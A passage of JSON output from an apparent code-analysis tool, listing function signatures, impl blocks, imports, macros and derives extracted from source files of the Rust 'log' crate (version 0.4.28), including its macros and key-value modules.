          "fn enabled(&self, metadata: &Metadata) -> bool {",
          "fn log(&self, record: &Record) {",
          "fn flush(&self) {",
          "fn enabled(&self, metadata: &Metadata) -> bool {",
          "fn log(&self, record: &Record) {",
          "fn flush(&self) {",
          "fn set_logger_inner<F>(make_logger: F) -> Result<(), SetLoggerError>",
          "fn fmt(&self, fmt: &mut fmt::Formatter) -> fmt::Result {",
          "fn fmt(&self, fmt: &mut fmt::Formatter) -> fmt::Result {",
          "fn test_levelfilter_from_str() {",
          "fn test_level_from_str() {",
          "fn test_level_as_str() {",
          "fn test_level_show() {",
          "fn test_levelfilter_show() {",
          "fn test_cross_cmp() {",
          "fn test_cross_eq() {",
          "fn test_to_level() {",
          "fn test_to_level_filter() {",
          "fn test_level_filter_as_str() {",
          "fn test_level_up() {",
          "fn test_level_filter_up() {",
          "fn test_level_down() {",
          "fn test_level_filter_down() {",
          "fn test_static_max_level_debug() {",
          "fn test_static_max_level_release() {",
          "fn test_error_trait() {",
          "fn test_metadata_builder() {",
          "fn test_metadata_convenience_builder() {",
          "fn test_record_builder() {",
          "fn test_record_convenience_builder() {",
          "fn test_record_complete_builder() {",
          "fn test_record_key_values_builder() {",
          "fn visit_pair(",
          "fn test_record_key_values_get_coerce() {",
          "fn test_foreign_impl() {",
          "fn assert_is_log<T: Log + ?Sized>() {}",
          "fn forall<T: Log + ?Sized>() {"
        ],
        "struct_defs": [
          "struct AtomicUsize {",
          "struct KeyValues<'a>(&'a dyn kv::Source);",
          "struct NopLogger;",
          "struct TestVisitSource {"
        ],
        "impl_blocks": [
          "impl AtomicUsize {",
          "impl PartialEq<LevelFilter> for Level {",
          "impl PartialOrd<LevelFilter> for Level {",
          "impl FromStr for Level {",
          "impl fmt::Display for Level {",
          "impl Level {",
          "impl PartialEq<Level> for LevelFilter {",
          "impl PartialOrd<Level> for LevelFilter {",
          "impl FromStr for LevelFilter {",
          "impl fmt::Display for LevelFilter {",
          "impl LevelFilter {",
          "impl Default for RecordBuilder<'_> {",
          "impl Default for MetadataBuilder<'_> {",
          "impl Log for NopLogger {",
          "impl fmt::Display for SetLoggerError {",
          "impl error::Error for SetLoggerError {}",
          "impl fmt::Display for ParseLevelError {",
          "impl error::Error for ParseLevelError {}"
        ],
        "uses": [
          "use std::cfg;",
          "use std::error;",
          "use std::str::FromStr;",
          "use std::{cmp, fmt, mem};",
          "use std::sync::atomic::{AtomicUsize, Ordering};",
          "use std::cell::Cell;",
          "use std::sync::atomic::Ordering;",
          "use super::{Level, LevelFilter, ParseLevelError, STATIC_MAX_LEVEL};",
          "use super::SetLoggerError;",
          "use super::MetadataBuilder;",
          "use super::Metadata;",
          "use super::{MetadataBuilder, RecordBuilder};",
          "use super::{Metadata, Record};",
          "use super::{Level, Record};",
          "use super::Record;",
          "use crate::kv::{self, VisitSource};",
          "use super::Record;",
          "use super::Log;",
          "use std::sync::Arc;"
        ],
        "macros": [
          "//!     info!(target: \"yak_events\", \"Commencing yak shaving for {yak:?}\");",
          "//!                 info!(\"Razor located: {razor}\");",
          "//!                 warn!(\"Unable to locate a razor: {err}, retrying\");",
          "//!     info!(target: \"yak_events\", yak:serde; \"Commencing yak shaving\");",
          "//!                 info!(razor; \"Razor located\");",
          "//!                 warn!(e:err; \"Unable to locate a razor, retrying\");",
          "//!             println!(\"{} - {}\", record.level(), record.args());",
          "compile_error!(\"multiple max_level_* features set\");",
          "compile_error!(\"multiple release_max_level_* features set\");",
          "/// assert_eq!(Some(Level::Error), levels.next());",
          "/// assert_eq!(Some(Level::Trace), levels.last());",
          "/// assert_eq!(Level::Debug, level.increment_severity());",
          "/// assert_eq!(Level::Trace, level.increment_severity().increment_severity());",
          "/// assert_eq!(Level::Trace, level.increment_severity().increment_severity().inc",
          "/// assert_eq!(Level::Warn, level.decrement_severity());",
          "/// assert_eq!(Level::Error, level.decrement_severity().decrement_severity());",
          "/// assert_eq!(Level::Error, level.decrement_severity().decrement_severity().dec",
          "/// assert_eq!(Some(LevelFilter::Off), levels.next());",
          "/// assert_eq!(Some(LevelFilter::Trace), levels.last());",
          "/// assert_eq!(LevelFilter::Debug, level_filter.increment_severity());",
          "/// assert_eq!(LevelFilter::Trace, level_filter.increment_severity().increment_s",
          "/// assert_eq!(LevelFilter::Trace, level_filter.increment_severity().increment_s",
          "/// assert_eq!(LevelFilter::Warn, level_filter.decrement_severity());",
          "/// assert_eq!(LevelFilter::Error, level_filter.decrement_severity().decrement_s",
          "/// assert_eq!(LevelFilter::Off, level_filter.decrement_severity().decrement_sev",
          "/// assert_eq!(LevelFilter::Off, level_filter.decrement_severity().decrement_sev",
          "///        println!(\"{}:{} -- {}\",",
          "///                 .args(format_args!(\"Error!\"))",
          "///                 .args(format_args!(\"Error!\"))",
          "/// - `args`: [`format_args!(\"\")`]",
          "/// [`format_args!(\"\")`]: https://doc.rust-lang.org/std/macro.format_args.html",
          "args: format_args!(\"\"),",
          "///             println!(\"{} - {}\", record.level(), record.args());",
          "///             println!(\"{} - {}\", record.level(), record.args());",
          "/// info!(\"hello log\");",
          "/// warn!(\"warning\");",
          "/// error!(\"oops\");",
          "unreachable!(\"set_logger_racy must not be used with other initialization functio",
          "pub const STATIC_MAX_LEVEL: LevelFilter = match cfg!(debug_assertions) {",
          "false if cfg!(feature = \"release_max_level_off\") => LevelFilter::Off,",
          "false if cfg!(feature = \"release_max_level_error\") => LevelFilter::Error,",
          "false if cfg!(feature = \"release_max_level_warn\") => LevelFilter::Warn,",
          "false if cfg!(feature = \"release_max_level_info\") => LevelFilter::Info,",
          "false if cfg!(feature = \"release_max_level_debug\") => LevelFilter::Debug,",
          "false if cfg!(feature = \"release_max_level_trace\") => LevelFilter::Trace,",
          "_ if cfg!(feature = \"max_level_off\") => LevelFilter::Off,",
          "_ if cfg!(feature = \"max_level_error\") => LevelFilter::Error,",
          "_ if cfg!(feature = \"max_level_warn\") => LevelFilter::Warn,",
          "_ if cfg!(feature = \"max_level_info\") => LevelFilter::Info,",
          "_ if cfg!(feature = \"max_level_debug\") => LevelFilter::Debug,",
          "assert_eq!(expected, &s.parse());",
          "assert_eq!(expected, &s.parse());",
          "assert_eq!(*expected, input.as_str());",
          "assert_eq!(\"INFO\", Level::Info.to_string());",
          "assert_eq!(\"ERROR\", Level::Error.to_string());",
          "assert_eq!(\"OFF\", LevelFilter::Off.to_string());",
          "assert_eq!(\"ERROR\", LevelFilter::Error.to_string());",
          "assert!(Level::Debug > LevelFilter::Error);",
          "assert!(LevelFilter::Warn < Level::Trace);",
          "assert!(LevelFilter::Off < Level::Error);",
          "assert!(Level::Error == LevelFilter::Error);",
          "assert!(LevelFilter::Off != Level::Error);",
          "assert!(Level::Trace == LevelFilter::Trace);",
          "assert_eq!(Some(Level::Error), LevelFilter::Error.to_level());",
          "assert_eq!(None, LevelFilter::Off.to_level());",
          "assert_eq!(Some(Level::Debug), LevelFilter::Debug.to_level());",
          "assert_eq!(LevelFilter::Error, Level::Error.to_level_filter());",
          "assert_eq!(LevelFilter::Trace, Level::Trace.to_level_filter());",
          "assert_eq!(*expected, input.as_str());",
          "assert_eq!(up, Level::Debug);",
          "assert_eq!(up, trace);",
          "assert_eq!(up, LevelFilter::Debug);",
          "assert_eq!(up, trace);",
          "assert_eq!(down, Level::Warn);",
          "assert_eq!(down, error);",
          "assert_eq!(down, LevelFilter::Warn);",
          "assert_eq!(down, LevelFilter::Off);",
          "assert_eq!(down.decrement_severity(), down);",
          "if cfg!(feature = \"max_level_off\") {",
          "assert_eq!(STATIC_MAX_LEVEL, LevelFilter::Off);",
          "} else if cfg!(feature = \"max_level_error\") {",
          "assert_eq!(STATIC_MAX_LEVEL, LevelFilter::Error);",
          "} else if cfg!(feature = \"max_level_warn\") {",
          "assert_eq!(STATIC_MAX_LEVEL, LevelFilter::Warn);",
          "} else if cfg!(feature = \"max_level_info\") {",
          "assert_eq!(STATIC_MAX_LEVEL, LevelFilter::Info);",
          "} else if cfg!(feature = \"max_level_debug\") {",
          "assert_eq!(STATIC_MAX_LEVEL, LevelFilter::Debug);",
          "assert_eq!(STATIC_MAX_LEVEL, LevelFilter::Trace);",
          "if cfg!(feature = \"release_max_level_off\") {",
          "assert_eq!(STATIC_MAX_LEVEL, LevelFilter::Off);",
          "} else if cfg!(feature = \"release_max_level_error\") {",
          "assert_eq!(STATIC_MAX_LEVEL, LevelFilter::Error);",
          "} else if cfg!(feature = \"release_max_level_warn\") {",
          "assert_eq!(STATIC_MAX_LEVEL, LevelFilter::Warn);",
          "} else if cfg!(feature = \"release_max_level_info\") {",
          "assert_eq!(STATIC_MAX_LEVEL, LevelFilter::Info);",
          "} else if cfg!(feature = \"release_max_level_debug\") {",
          "assert_eq!(STATIC_MAX_LEVEL, LevelFilter::Debug);",
          "} else if cfg!(feature = \"release_max_level_trace\") {",
          "assert_eq!(STATIC_MAX_LEVEL, LevelFilter::Trace);",
          "} else if cfg!(feature = \"max_level_off\") {",
          "assert_eq!(STATIC_MAX_LEVEL, LevelFilter::Off);",
          "} else if cfg!(feature = \"max_level_error\") {",
          "assert_eq!(STATIC_MAX_LEVEL, LevelFilter::Error);",
          "} else if cfg!(feature = \"max_level_warn\") {",
          "assert_eq!(STATIC_MAX_LEVEL, LevelFilter::Warn);",
          "} else if cfg!(feature = \"max_level_info\") {",
          "assert_eq!(STATIC_MAX_LEVEL, LevelFilter::Info);",
          "} else if cfg!(feature = \"max_level_debug\") {",
          "assert_eq!(STATIC_MAX_LEVEL, LevelFilter::Debug);",
          "assert_eq!(STATIC_MAX_LEVEL, LevelFilter::Trace);",
          "assert_eq!(",
          "assert_eq!(metadata_test.level(), Level::Debug);",
          "assert_eq!(metadata_test.target(), \"myApp\");",
          "assert_eq!(metadata_test.level(), Level::Debug);",
          "assert_eq!(metadata_test.target(), \"myApp\");",
          "let fmt_args = format_args!(\"hello\");",
          "assert_eq!(record_test.metadata().target(), \"myApp\");",
          "assert_eq!(record_test.module_path(), Some(\"foo\"));",
          "assert_eq!(record_test.file(), Some(\"bar\"));",
          "assert_eq!(record_test.line(), Some(30));",
          "let fmt_args = format_args!(\"hello\");",
          "assert_eq!(record_test.target(), \"myApp\");",
          "assert_eq!(record_test.module_path(), Some(\"foo\"));",
          "assert_eq!(record_test.file(), Some(\"bar\"));",
          "assert_eq!(record_test.line(), Some(30));",
          "assert_eq!(record_test.target(), \"myApp\");",
          "assert_eq!(record_test.level(), Level::Error);",
          "assert_eq!(record_test.module_path(), Some(\"foo\"));",
          "assert_eq!(record_test.file(), Some(\"bar\"));",
          "assert_eq!(record_test.line(), Some(30));",
          "assert_eq!(2, visitor.seen_pairs);",
          "assert_eq!("
        ],
        "derives": [
          "#[derive(Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Debug, Hash)]",
          "#[derive(Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Debug, Hash)]",
          "#[derive(Copy, Clone, Eq, PartialEq, Ord, PartialOrd, Hash, Debug)]",
          "#[derive(Clone, Debug)]",
          "#[derive(Clone)]",
          "#[derive(Debug)]",
          "#[derive(Clone, Eq, PartialEq, Ord, PartialOrd, Hash, Debug)]",
          "#[derive(Eq, PartialEq, Ord, PartialOrd, Hash, Debug)]",
          "#[derive(Debug)]",
          "#[derive(Debug, PartialEq, Eq)]"
        ],
        "error_handling": 27
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/log-0.4.28/src/macros.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [
          "/// log!(Level::Error, \"Received errors: {}, {}\", data.0, data.1);",
          "/// log!(",
          "/// log!(",
          "// log!(logger: my_logger, target: \"my_target\", Level::Info, \"a {} event\", \"log\"",
          "$crate::__log!(",
          "logger: $crate::__log_logger!($logger),",
          "// log!(logger: my_logger, Level::Info, \"a log event\")",
          "$crate::__log!(",
          "logger: $crate::__log_logger!($logger),",
          "target: $crate::__private_api::module_path!(),",
          "// log!(target: \"my_target\", Level::Info, \"a log event\")",
          "$crate::__log!(",
          "logger: $crate::__log_logger!(__log_global_logger),",
          "// log!(Level::Info, \"a log event\")",
          "$crate::__log!(",
          "logger: $crate::__log_logger!(__log_global_logger),",
          "target: $crate::__private_api::module_path!(),",
          "// log!(logger: my_logger, target: \"my_target\", Level::Info, key1:? = 42, key2 =",
          "$crate::__private_api::format_args!($($arg)+),",
          "&($target, $crate::__private_api::module_path!(), $crate::__private_api::loc()),",
          "&[$(($crate::__log_key!($key), $crate::__log_value!($key $(:$capture)* = $($valu",
          "// log!(logger: my_logger, target: \"my_target\", Level::Info, \"a {} event\", \"log\"",
          "$crate::__private_api::format_args!($($arg)+),",
          "&($target, $crate::__private_api::module_path!(), $crate::__private_api::loc()),",
          "/// error!(\"Error: {err_info} on port {port}\");",
          "/// error!(target: \"app_events\", \"App Error: {err_info}, Port: {port}\");",
          "/// error!(logger: my_logger, \"App Error: {err_info}, Port: {port}\");",
          "// error!(logger: my_logger, target: \"my_target\", key1 = 42, key2 = true; \"a {} ",
          "// error!(logger: my_logger, target: \"my_target\", \"a {} event\", \"log\")",
          "$crate::log!(logger: $crate::__log_logger!($logger), target: $target, $crate::Le",
          "// error!(logger: my_logger, key1 = 42, key2 = true; \"a {} event\", \"log\")",
          "// error!(logger: my_logger, \"a {} event\", \"log\")",
          "$crate::log!(logger: $crate::__log_logger!($logger), $crate::Level::Error, $($ar",
          "// error!(target: \"my_target\", key1 = 42, key2 = true; \"a {} event\", \"log\")",
          "// error!(target: \"my_target\", \"a {} event\", \"log\")",
          "$crate::log!(target: $target, $crate::Level::Error, $($arg)+)",
          "// error!(\"a {} event\", \"log\")",
          "($($arg:tt)+) => ($crate::log!($crate::Level::Error, $($arg)+))",
          "/// warn!(\"Warning! {warn_description}!\");",
          "/// warn!(target: \"input_events\", \"App received warning: {warn_description}\");",
          "/// warn!(logger: my_logger, \"App received warning: {warn_description}\");",
          "// warn!(logger: my_logger, target: \"my_target\", key1 = 42, key2 = true; \"a {} e",
          "// warn!(logger: my_logger, target: \"my_target\", \"a {} event\", \"log\")",
          "$crate::log!(logger: $crate::__log_logger!($logger), target: $target, $crate::Le",
          "// warn!(logger: my_logger, key1 = 42, key2 = true; \"a {} event\", \"log\")",
          "// warn!(logger: my_logger, \"a {} event\", \"log\")",
          "$crate::log!(logger: $crate::__log_logger!($logger), $crate::Level::Warn, $($arg",
          "// warn!(target: \"my_target\", key1 = 42, key2 = true; \"a {} event\", \"log\")",
          "// warn!(target: \"my_target\", \"a {} event\", \"log\")",
          "$crate::log!(target: $target, $crate::Level::Warn, $($arg)+)",
          "// warn!(\"a {} event\", \"log\")",
          "($($arg:tt)+) => ($crate::log!($crate::Level::Warn, $($arg)+))",
          "/// info!(\"Connected to port {} at {} Mb/s\", conn_info.port, conn_info.speed);",
          "/// info!(",
          "/// info!(",
          "// info!(logger: my_logger, target: \"my_target\", key1 = 42, key2 = true; \"a {} e",
          "// info!(logger: my_logger, target: \"my_target\", \"a {} event\", \"log\")",
          "$crate::log!(logger: $crate::__log_logger!($logger), target: $target, $crate::Le",
          "// info!(logger: my_logger, key1 = 42, key2 = true; \"a {} event\", \"log\")",
          "// info!(logger: my_logger, \"a {} event\", \"log\")",
          "$crate::log!(logger: $crate::__log_logger!($logger), $crate::Level::Info, $($arg",
          "// info!(target: \"my_target\", key1 = 42, key2 = true; \"a {} event\", \"log\")",
          "// info!(target: \"my_target\", \"a {} event\", \"log\")",
          "$crate::log!(target: $target, $crate::Level::Info, $($arg)+)",
          "// info!(\"a {} event\", \"log\")",
          "($($arg:tt)+) => ($crate::log!($crate::Level::Info, $($arg)+))",
          "/// debug!(\"New position: x: {}, y: {}\", pos.x, pos.y);",
          "/// debug!(target: \"app_events\", \"New position: x: {}, y: {}\", pos.x, pos.y);",
          "/// debug!(logger: my_logger, \"New position: x: {}, y: {}\", pos.x, pos.y);",
          "// debug!(logger: my_logger, target: \"my_target\", key1 = 42, key2 = true; \"a {} ",
          "// debug!(logger: my_logger, target: \"my_target\", \"a {} event\", \"log\")",
          "$crate::log!(logger: $crate::__log_logger!($logger), target: $target, $crate::Le",
          "// debug!(logger: my_logger, key1 = 42, key2 = true; \"a {} event\", \"log\")",
          "// debug!(logger: my_logger, \"a {} event\", \"log\")",
          "$crate::log!(logger: $crate::__log_logger!($logger), $crate::Level::Debug, $($ar",
          "// debug!(target: \"my_target\", key1 = 42, key2 = true; \"a {} event\", \"log\")",
          "// debug!(target: \"my_target\", \"a {} event\", \"log\")",
          "$crate::log!(target: $target, $crate::Level::Debug, $($arg)+)",
          "// debug!(\"a {} event\", \"log\")",
          "($($arg:tt)+) => ($crate::log!($crate::Level::Debug, $($arg)+))",
          "/// trace!(\"Position is: x: {}, y: {}\", pos.x, pos.y);",
          "/// trace!(target: \"app_events\", \"x is {} and y is {}\",",
          "/// trace!(logger: my_logger, \"x is {} and y is {}\",",
          "// trace!(logger: my_logger, target: \"my_target\", key1 = 42, key2 = true; \"a {} ",
          "// trace!(logger: my_logger, target: \"my_target\", \"a {} event\", \"log\")",
          "$crate::log!(logger: $crate::__log_logger!($logger), target: $target, $crate::Le",
          "// trace!(logger: my_logger, key1 = 42, key2 = true; \"a {} event\", \"log\")",
          "// trace!(logger: my_logger, \"a {} event\", \"log\")",
          "$crate::log!(logger: $crate::__log_logger!($logger), $crate::Level::Trace, $($ar",
          "// trace!(target: \"my_target\", key1 = 42, key2 = true; \"a {} event\", \"log\")",
          "// trace!(target: \"my_target\", \"a {} event\", \"log\")",
          "$crate::log!(target: $target, $crate::Level::Trace, $($arg)+)",
          "// trace!(\"a {} event\", \"log\")",
          "($($arg:tt)+) => ($crate::log!($crate::Level::Trace, $($arg)+))",
          "/// if log_enabled!(Level::Debug) {",
          "///     debug!(\"expensive debug data: {} {}\", data.x, data.y);",
          "/// if log_enabled!(target: \"Global\", Level::Debug) {",
          "///    debug!(target: \"Global\", \"expensive debug data: {} {}\", data.x, data.y);",
          "/// if log_enabled!(logger: my_logger, Level::Debug) {",
          "///    debug!(target: \"Global\", \"expensive debug data: {} {}\", data.x, data.y);",
          "// log_enabled!(logger: my_logger, target: \"my_target\", Level::Info)",
          "$crate::__log_enabled!(logger: $crate::__log_logger!($logger), target: $target, ",
          "// log_enabled!(logger: my_logger, Level::Info)",
          "$crate::__log_enabled!(logger: $crate::__log_logger!($logger), target: $crate::_",
          "// log_enabled!(target: \"my_target\", Level::Info)",
          "$crate::__log_enabled!(logger: $crate::__log_logger!(__log_global_logger), targe",
          "// log_enabled!(Level::Info)",
          "$crate::__log_enabled!(logger: $crate::__log_logger!(__log_global_logger), targe",
          "// log_enabled!(logger: my_logger, target: \"my_target\", Level::Info)",
          "$crate::__private_api::stringify!($($args)*)",
          "compile_error!(\"key value support requires the `kv` feature of `log`\")",
          "$crate::__log_value!(($args):value)",
          "$crate::__log_value!(($args):$capture)",
          "$crate::__log_value!(($key):value)",
          "$crate::__log_value!(($key):$capture)",
          "$crate::__log_value_error!($args)",
          "$crate::__log_value_sval!($args)",
          "$crate::__log_value_serde!($args)",
          "compile_error!(\"key value support requires the `kv` feature of `log`\")",
          "compile_error!(\"capturing values as `sval::Value` requites the `kv_sval` feature",
          "compile_error!(",
          "compile_error!("
        ],
        "derives": [],
        "error_handling": 3
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/log-0.4.28/src/kv/key.rs",
        "function_defs": [
          "fn to_key(&self) -> Key;",
          "fn to_key(&self) -> Key {",
          "fn to_key(&self) -> Key {",
          "fn to_key(&self) -> Key {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn as_ref(&self) -> &str {",
          "fn borrow(&self) -> &str {",
          "fn from(s: &'k str) -> Self {",
          "fn to_key(&self) -> Key {",
          "fn to_key(&self) -> Key {",
          "fn stream<'sval, S: sval::Stream<'sval> + ?Sized>(",
          "fn stream_ref<S: sval::Stream<'a> + ?Sized>(&self, stream: &mut S) -> sval::Result {",
          "fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>",
          "fn key_from_string() {",
          "fn key_to_borrowed() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl ToKey for str {",
          "impl ToKey for String {"
        ],
        "uses": [
          "use std::borrow::Borrow;",
          "use std::fmt;",
          "use super::*;",
          "use std::borrow::Cow;",
          "use super::*;",
          "use sval::Value;",
          "use sval_ref::ValueRef;",
          "use super::*;",
          "use serde::{Serialize, Serializer};",
          "use super::*;"
        ],
        "macros": [
          "assert_eq!(\"a key\", Key::from_str(\"a key\").as_str());",
          "assert_eq!(\"a key\", Key::from_str(\"a key\").to_borrowed_str().unwrap());"
        ],
        "derives": [
          "#[derive(Clone, Debug, PartialEq, Eq, PartialOrd, Ord, Hash)]"
        ],
        "error_handling": 4
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/log-0.4.28/src/kv/error.rs",
        "function_defs": [
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn from(_: fmt::Error) -> Self {",
          "fn from(err: io::Error) -> Self {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Error {",
          "impl fmt::Display for Error {",
          "impl From<fmt::Error> for Error {",
          "impl Error {",
          "impl error::Error for Error {}",
          "impl From<io::Error> for Error {"
        ],
        "uses": [
          "use std::fmt;",
          "use self::Inner::*;",
          "use super::*;",
          "use std::{error, io};"
        ],
        "macros": [],
        "derives": [
          "#[derive(Debug)]",
          "#[derive(Debug)]"
        ],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/log-0.4.28/src/kv/source.rs",
        "function_defs": [
          "fn visit<'kvs>(&'kvs self, visitor: &mut dyn VisitSource<'kvs>) -> Result<(), Error>;",
          "fn get(&self, key: Key) -> Option<Value<'_>> {",
          "fn count(&self) -> usize {",
          "fn get_default<'v>(source: &'v (impl Source + ?Sized), key: Key) -> Option<Value<'v>> {",
          "fn visit_pair(&mut self, key: Key<'kvs>, value: Value<'kvs>) -> Result<(), Error> {",
          "fn count_default(source: impl Source) -> usize {",
          "fn visit_pair(&mut self, _: Key<'kvs>, _: Value<'kvs>) -> Result<(), Error> {",
          "fn visit<'kvs>(&'kvs self, visitor: &mut dyn VisitSource<'kvs>) -> Result<(), Error> {",
          "fn get(&self, key: Key) -> Option<Value<'_>> {",
          "fn count(&self) -> usize {",
          "fn visit<'kvs>(&'kvs self, visitor: &mut dyn VisitSource<'kvs>) -> Result<(), Error> {",
          "fn get(&self, key: Key) -> Option<Value<'_>> {",
          "fn count(&self) -> usize {",
          "fn visit<'kvs>(&'kvs self, visitor: &mut dyn VisitSource<'kvs>) -> Result<(), Error> {",
          "fn get(&self, key: Key) -> Option<Value<'_>> {",
          "fn count(&self) -> usize {",
          "fn visit<'kvs>(&'kvs self, visitor: &mut dyn VisitSource<'kvs>) -> Result<(), Error> {",
          "fn get(&self, key: Key) -> Option<Value<'_>> {",
          "fn count(&self) -> usize {",
          "fn visit<'kvs>(&'kvs self, visitor: &mut dyn VisitSource<'kvs>) -> Result<(), Error> {",
          "fn get(&self, key: Key) -> Option<Value<'_>> {",
          "fn count(&self) -> usize {",
          "fn visit_pair(&mut self, key: Key<'kvs>, value: Value<'kvs>) -> Result<(), Error>;",
          "fn visit_pair(&mut self, key: Key<'kvs>, value: Value<'kvs>) -> Result<(), Error> {",
          "fn visit_pair(&mut self, key: Key<'kvs>, value: Value<'kvs>) -> Result<(), Error> {",
          "fn visit_pair(&mut self, key: Key<'kvs>, value: Value<'kvs>) -> Result<(), Error> {",
          "fn visit_pair(&mut self, key: Key<'kvs>, value: Value<'kvs>) -> Result<(), Error> {",
          "fn visit_pair(&mut self, key: Key<'kvs>, value: Value<'kvs>) -> Result<(), Error> {",
          "fn visit<'kvs>(&'kvs self, visitor: &mut dyn VisitSource<'kvs>) -> Result<(), Error> {",
          "fn get(&self, key: Key) -> Option<Value<'_>> {",
          "fn count(&self) -> usize {",
          "fn visit<'kvs>(&'kvs self, visitor: &mut dyn VisitSource<'kvs>) -> Result<(), Error> {",
          "fn get(&self, key: Key) -> Option<Value<'_>> {",
          "fn count(&self) -> usize {",
          "fn visit<'kvs>(&'kvs self, visitor: &mut dyn VisitSource<'kvs>) -> Result<(), Error> {",
          "fn get(&self, key: Key) -> Option<Value<'_>> {",
          "fn count(&self) -> usize {",
          "fn visit<'kvs>(&'kvs self, visitor: &mut dyn VisitSource<'kvs>) -> Result<(), Error> {",
          "fn get(&self, key: Key) -> Option<Value<'_>> {",
          "fn count(&self) -> usize {",
          "fn visit_pair(&mut self, key: Key<'kvs>, value: Value<'kvs>) -> Result<(), Error> {",
          "fn visit<'kvs>(&'kvs self, visitor: &mut dyn VisitSource<'kvs>) -> Result<(), Error> {",
          "fn get(&self, key: Key) -> Option<Value<'_>> {",
          "fn count(&self) -> usize {",
          "fn visit<'kvs>(&'kvs self, visitor: &mut dyn VisitSource<'kvs>) -> Result<(), Error> {",
          "fn get(&self, key: Key) -> Option<Value<'_>> {",
          "fn count(&self) -> usize {",
          "fn count() {",
          "fn get() {",
          "fn hash_map() {",
          "fn btree_map() {",
          "fn source_is_object_safe() {",
          "fn _check(_: &dyn Source) {}",
          "fn visitor_is_object_safe() {",
          "fn _check(_: &dyn VisitSource) {}",
          "fn count() {",
          "fn visit<'kvs>(&'kvs self, visitor: &mut dyn VisitSource<'kvs>) -> Result<(), Error> {",
          "fn get() {"
        ],
        "struct_defs": [
          "struct Get<'k, 'v> {",
          "struct Count(usize);",
          "struct OnePair {"
        ],
        "impl_blocks": [
          "impl Source for OnePair {"
        ],
        "uses": [
          "use crate::kv::{Error, Key, ToKey, ToValue, Value};",
          "use std::fmt;",
          "use super::*;",
          "use std::borrow::Borrow;",
          "use std::collections::{BTreeMap, HashMap};",
          "use std::hash::{BuildHasher, Hash};",
          "use std::rc::Rc;",
          "use std::sync::Arc;",
          "use crate::kv::value;",
          "use super::*;",
          "use crate::kv::value;",
          "use super::*;"
        ],
        "macros": [
          "///         println!(\"{key}: {value}\");",
          "assert_eq!(1, Source::count(&Box::new((\"a\", 1))));",
          "assert_eq!(2, Source::count(&vec![(\"a\", 1), (\"b\", 2)]));",
          "assert_eq!(",
          "assert!(Source::get(&source, Key::from_str(\"a\")).is_none());",
          "assert_eq!(2, Source::count(&map));",
          "assert_eq!(",
          "assert_eq!(2, Source::count(&map));",
          "assert_eq!(",
          "assert_eq!(1, Source::count(&(\"a\", 1)));",
          "assert_eq!(2, Source::count(&[(\"a\", 1), (\"b\", 2)] as &[_]));",
          "assert_eq!(0, Source::count(&None::<(&str, i32)>));",
          "assert_eq!(1, Source::count(&OnePair { key: \"a\", value: 1 }));",
          "assert_eq!(",
          "assert_eq!(",
          "assert!(Source::get(&source, Key::from_str(\"c\")).is_none());",
          "assert!(Source::get(&source, Key::from_str(\"a\")).is_none());"
        ],
        "derives": [],
        "error_handling": 17
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/log-0.4.28/src/kv/mod.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [
          "//! info!(a = 1; \"Something of interest\");",
          "//! info!(a; \"Something of interest\");",
          "//! info!(a:? = 1; \"Something of interest\");",
          "//! // info!(a = 1; \"Something of interest\");",
          "//! assert_eq!(1, a.to_i64().unwrap());",
          "//! // info!(a = 1, b = 2, c = 3; \"Something of interest\");",
          "//! assert_eq!(",
          "//! // info!(a = 1; \"Something of interest\");",
          "//! assert_eq!(1, a.to_i64().unwrap());",
          "//! // info!(a = 1; \"Something of interest\");",
          "//! assert!(is_numeric);",
          "//! // info!(a = data; \"Something of interest\");",
          "//! assert_eq!(\"{\\\"a\\\":1,\\\"b\\\":true,\\\"c\\\":\\\"Some data\\\"}\", serde_json::to_string",
          "//! // info!(a = data; \"Something of interest\");",
          "//! assert_eq!(\"Data { a: 1, b: true, c: \\\"Some data\\\" }\", format!(\"{a:?}\"));"
        ],
        "derives": [],
        "error_handling": 13
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/log-0.4.28/src/kv/value.rs",
        "function_defs": [
          "fn to_value(&self) -> Value;",
          "fn to_value(&self) -> Value {",
          "fn to_value(&self) -> Value {",
          "fn from_inner<T>(value: T) -> Self",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn serialize<S>(&self, s: S) -> Result<S::Ok, S::Error>",
          "fn stream<'sval, S: sval::Stream<'sval> + ?Sized>(&'sval self, stream: &mut S) -> sval::Result {",
          "fn stream_ref<S: sval::Stream<'v> + ?Sized>(&self, stream: &mut S) -> sval::Result {",
          "fn to_value(&self) -> Value {",
          "fn from(value: &'v str) -> Self {",
          "fn to_value(&self) -> Value {",
          "fn to_value(&self) -> Value {",
          "fn to_value(&self) -> Value {",
          "fn from(value: $into_ty) -> Self {",
          "fn from(value: &'v $into_ty) -> Self {",
          "fn to_value(&self) -> Value {",
          "fn from(value: std::num::$into_ty) -> Self {",
          "fn from(value: &'v std::num::$into_ty) -> Self {",
          "fn to_value(&self) -> Value {",
          "fn to_value(&self) -> Value {",
          "fn to_value(&self) -> Value {",
          "fn to_value(&self) -> Value {",
          "fn to_value(&self) -> Value {",
          "fn from(v: &'v String) -> Self {",
          "fn visit_any(&mut self, value: Value) -> Result<(), Error>;",
          "fn visit_null(&mut self) -> Result<(), Error> {",
